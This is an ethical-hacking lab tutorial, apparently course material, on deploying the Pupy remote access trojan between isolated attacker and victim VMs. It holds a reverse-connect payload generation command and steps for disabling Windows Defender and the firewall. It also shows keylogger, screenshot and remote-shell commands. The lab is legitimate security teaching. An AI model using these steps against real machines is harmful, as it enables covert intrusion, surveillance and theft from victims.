# Malware

The cross-platform and multi-function **RAT (Remote Access Trojan)**, can be a valuable exercise for penetration testers, researchers, and security enthusiasts. Like other hacking tools, **Pupy** is designed for post-exploitation activities, allowing you to control target machines once a foothold is established. Setting up a controlled environment for testing Pupy requires adhering to strict ethical standards and ensuring that testing is conducted in a legal and isolated setting.

### **What is Pupy?**
- **Pupy** is an open-source, cross-platform RAT designed for post-exploitation purposes. It supports Windows, Linux, macOS, and Android.
- It enables attackers to execute commands remotely, steal data, or control systems in various ways.
- It is often used in controlled environments to simulate attacks and improve security defenses.

### **Goals of the Ethical Hacking Lab:**
- Simulate a real-world scenario where a system can be compromised, and Pupy is used for post-exploitation.
- Learn how to set up and use Pupy in a controlled, ethical environment.
- Ensure that the lab is isolated and has no connection to external networks to avoid unintentional malicious use.

---

### Task 1: **Set Up The Isolation For Virtual Machines**

In a safe ethical hacking environment, you'll want to use **Virtual Machines (VMs)** to isolate the attacker and victim environments. Tools like **VirtualBox** or **VMware** are ideal for this purpose.

- **VM 1 (Attacker Machine)**: `Parrot OS`. It is pre-configured for penetration testing and include various tools needed for ethical hacking.
- **VM 2 (Victim Machine)**: `Windows`. It is the most popular operating system for personal computers.

- Create a VirtualBox `Internal Network`, then connect your attacker VM and victim vm to it.
  - 🖥️ Internal network
  - 🖥️ Parrot connected to the internal network
  - 🖥️ Windows connected to the internal network
  - 🖥️ Make sure Windows can ping Parrot

- 👉 If you can't access Windows network setting GUI, you may open an Administrator PowerShell then access with commands:
  ```powershell
  # 1. directly open the Network Connections control panel
  control ncpa.cpl
  # OR, 2. open the broader Network and Sharing Center
  control netcenter
  # OR, 3. To open the Internet Options control panel:
  control inetcpl.cpl
  # OR, 4. open the Network and Sharing Center directly:
  control.exe /name Microsoft.NetworkAndSharingCenter
  ```
- 👉 Configure Parrot network through shell commands:
  ```bash
  # 1. identify your network interface name:
  ip link show # enp0s3, eth0: possible names for physical network interface
  # ⚠️ change <if> to your network interface name
  # 2. Set the IP address and subnet mask:
  sudo ip addr add 192.168.1.100/24 dev <if>
  # verify
  ip addr show eth0
  # 3. Bring the interface up
  sudo ip link set <if> up
  # 4. Set the default route (gateway):
  sudo ip route add default via 192.168.1.1
  # verify
  ip route show
  # 5. Set DNS servers:
  sudo nano /etc/resolv.conf
  # add two lines below without #
  # nameserver 8.8.8.8
  # nameserver 8.8.4.4

  # verify
  cat /etc/resolv.conf
  ```
  - For persistent configuration, save settings in /etc/netplan/01-netcfg.yaml as below:
    - Just for reference, not recommended.
  ```
  network:
    ethernets:
      <if>:
        addresses:
          - 192.168.1.100/24
        gateway4: 192.168.1.1
        nameservers:
          addresses: [8.8.8.8, 8.8.4.4]
  version: 2  
  ```

#### [VirtualBox networking modes](https://www.virtualbox.org/manual/ch06.html)

| Network Type       | VM to VM Communication | Host to VM Communication | External Network Access | Best Use Case                      |
|--------------------|-----------------------|--------------------------|-------------------------|-------------------------------------|
| NAT                | No                    | Yes                      | Yes                     | Basic internet access               |
| NAT Network        | Yes                   | Yes                      | Yes                     | VMs need to talk to each other and the internet |
| Bridged Adapter    | Yes                   | Yes                      | Yes                     | Accessible from the local network   |
| Host-Only Adapter   | Yes                   | Yes                      | No                      | Isolated testing environment        |
| `Internal Network `  | Yes                   | No                       | No                      | Secure, isolated environments        |
| Generic Driver     | Depends on setup      | Depends on setup         | Depends on setup        | Custom networking configurations     |

#### Choosing the Right Mode

The right network mode for your VirtualBox environment depends on your specific use case:

- For **testing and development** where you want isolation (e.g., ethical hacking labs), **Host-Only** or **Internal Network** is preferred.
- If your VMs need to **access the internet**, consider using **NAT** or **NAT Network**.
- If you need to expose services to your **local network**, go with the **Bridged Adapter**.

---

### Task 2: **Install Pupy on the Attacker Machine**

On your attacker machine, if **Pupy** is not preinstalled, you'll install it, then configure it to generate payloads and control compromised systems.

- **Pupy RAT** source code from its official repository: [Pupy GitHub](https://github.com/n1nj4sec/pupy).
- Connect Parrot to NAT Network for this installation temporarily.
  - Reconnect to the Internal Network after installation.

#### **Steps to Install Pupy:**
- **Method 1: Local installation**
1. **Clone the Pupy GitHub Repository:**
   Open a terminal and run the following commands:
   ```bash
   git clone https://github.com/n1nj4sec/pupy.git
   # or download the archive from: https://github.com/n1nj4sec/pupy/tags
   # then unzip it
   cd pupy
   ```

2. **Install Dependencies:**
   Pupy has various dependencies, which you need to install:
   ```bash
   sudo apt-get update
   sudo apt-get install python-pip python-dev build-essential
   pip install -r requirements.txt
   ```

3. **Install PyInstaller (for payload generation):**
   Pupy uses PyInstaller to create executables. Install it using:
   ```bash
   pip install pyinstaller
   ```

4. **Start the Pupy Server:**
   Once all dependencies are installed, start the **Pupy** server, which will handle incoming connections from the compromised machines:
   ```bash
   python pupysh.py
   ```

   This will start the Pupy interactive shell where you can generate payloads and manage compromised systems.

- **Method 2: Docker (suggested)**
  - Install docker
  - [Pull then use Pupy docker image](https://github.com/n1nj4sec/pupy/tree/unstable)

    ```bash
    # 1. Pull Image
    docker image pull cyb3rward0g/docker-pupy:f8c829dd66449888ec3f4c7d086e607060bca892
    # 2. Tag image
    docker tag cyb3rward0g/docker-pupy:f8c829dd66449888ec3f4c7d086e607060bca892 docker-pupy
    # 3. Run Image 
    docker run --rm -it -p 1234:1234 docker-pupy python pupysh.py
    # OR, mount a host folder where you have all your payloads
    docker run --rm -it -p 1234:1234 -v "/opt/payloads:/tmp/payloads" docker-pupy python pupysh.py
    ```

- 💻 Pupy interactive shell

---

### Task 3: **Generate Pupy Payload**

After setting up the **Pupy server**, you will need to generate a payload that can be executed on the **victim machine**.

#### **Steps to Generate Payloads:**

1. **Choose the Type of Payload**:
   You can create payloads for Windows the platform of the victim machine.

   Generating a **Windows executable payload**:
   ```bash
   gen -f exe_x64 connect --host <attacker_ip>:<port>
   # example: gen -f exe_x64 connect --host 192.168.1.100:8888
   ```

   This will create a payload that connects back to your **Pupy** server at `<attacker_ip>:<port>`.

- 💻 the payload

2. **Transfer Payload to Victim**:
   Use a method (like file sharing) to transfer the payload to the victim machine, or HTTP:

   - On the attacker VM, start a simple HTTP server in the folder contains the payload:
     ```shell
     python3 -m http.server 8080
     ```
    - 💻 the running HTTP server
  - On the victim VM, access the simple HTTP server from a browser. Type the following URL in its address box:
    - `http://your_parrot_ip:8080`
    - then download the payload
    - 💻 the payload on the webpage

---

### Task 4: **Set Up the Victim Machine**

On the **victim machine** (the VM you are targeting), ensure the following:
   
1. **Disable IE security, Firewall, and Antivirus (for testing purposes)**:
   - If using a Windows VM, disable any antivirus to prevent the payload from being immediately blocked.
   - From the Server Manager, turn off `IE Enhanced Security` and `firewall`
     - 💻 show both configurations are off
   - Turn off Windows Defender
     - Use Group Policy Editor (gpedit.msc)
     - Navigate to Computer Configuration > Administrative Templates > Windows Components > Windows Defender Antivirus
     - Set "Turn off Windows Defender Antivirus" to "Enabled"
     - Open an Administrator Powershell to apply the update
       ```powershell
       gpupdate /force
       ``` 
     - 💻 show Windows Defender is turned off

2. **Execute the Payload**:
   - Once transferred, execute the Pupy payload on the victim machine.
   - 💻 the running Puppy payload

---

### Task 5: **Establish a Connection with Pupy**

Once the payload is executed on the victim machine, the **Pupy server** running on the attacker machine should receive a connection.

1. **Monitor Incoming Connections**:
   From your **Pupy shell** on the attacker machine, you should see an active session once the victim machine is compromised.
   
   Example of listing connected clients:
   ```bash
   sessions
   ```
   - 💻 the connected clients

2. **Interacting with the Victim Machine**:
   You can interact with the victim machine by using various **Pupy modules** and commands for remote control. Examples include:
   - **Keylogging**:
     ```bash
     run keylogger
     ```
   - **Screenshot Capture**:
     ```bash
     run screenshot
     ```
   - **Remote Shell Access**:
     ```bash
     shell
     ```

   Explore the various modules and capabilities of Pupy for ethical research purposes.
   - 💻 keylogger
   - 💻 screenshot of the victim VM from the attacker
   - 💻 remote shell


### Task 6: **Decommission the Lab**

Once your testing is complete:
- **Delete any payloads** and malicious files.
- **Restore the victim machines**
  - 🖥️ Turn on IE enhanced security and firewall.
  - 🖥️ Turn on Windows Defender

---

### **Security Considerations**:

- **Ethical Testing Only**: Never use Pupy or any other RAT outside of a controlled environment without explicit permission.
- **Isolate the Lab**: Keep your virtual machines and payloads isolated from any real-world networks.
- **Monitor for Malicious Code**: Use tools like **Wireshark** to ensure no unintended data leakage occurs from your test environment.


# References
- [Pupy](https://github.com/n1nj4sec/pupy)
- [PracticalMalwareAnalysis-Labs](https://github.com/mikesiko/PracticalMalwareAnalysis-Labs)
  - [Book](https://nostarch.com/malware)
  - [Class 2019](https://samsclass.info/126/126_F19.shtml)
  - [Class 2017](https://samsclass.info/126/126_DC_2017.shtml)